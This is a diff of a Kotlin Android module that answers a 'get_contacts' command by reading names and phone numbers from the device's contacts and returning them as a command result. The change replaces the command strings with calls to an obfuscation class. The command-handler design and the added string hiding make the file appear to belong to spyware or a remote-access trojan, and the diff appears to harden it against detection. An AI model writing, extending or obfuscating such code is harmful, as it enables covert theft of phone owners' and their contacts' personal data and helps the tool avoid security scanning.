@@ -2,11 +2,12 @@ package com.nexlink.bridge.modules
 
 import android.content.Context
 import android.provider.ContactsContract
+import com.nexlink.bridge.ObfStr
 
 internal object ContactsModule {
     fun execute(ctx: Context, command: String): Pair<String, String> {
-        val limit = command.substringAfter("get_contacts:", "").toIntOrNull() ?: 200
-        return Pair(getContacts(ctx, limit), "command_result")
+        val limit = command.substringAfter(ObfStr.cmdContactsPrefix(), "").toIntOrNull() ?: 200
+        return Pair(getContacts(ctx, limit), ObfStr.cmdResult())
     }
     private fun getContacts(ctx: Context, limit: Int): String {
         return try {
@@ -16,8 +17,8 @@ internal object ContactsModule {
                         ContactsContract.CommonDataKinds.Phone.NUMBER),
                 null, null,
                 "${ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME} ASC"
-            ) ?: return "⚠️ Cannot read contacts"
-            val sb = StringBuilder("=== Contacts (limit $limit) ===\n")
+            ) ?: return "Cannot read contacts"
+            val sb = StringBuilder("Contacts (limit $limit)\n")
             var n  = 0
             cur.use {
                 while (it.moveToNext() && n < limit) {
@@ -25,7 +26,7 @@ internal object ContactsModule {
                     n++
                 }
             }
-            if (n == 0) sb.append("No contacts") else sb.appendLine("\nTotal: $n")
+            if (n == 0) sb.append("Empty") else sb.appendLine("\nTotal: $n")
             sb.toString()
         } catch (e: Exception) { "Error: ${e.message}" }
     }
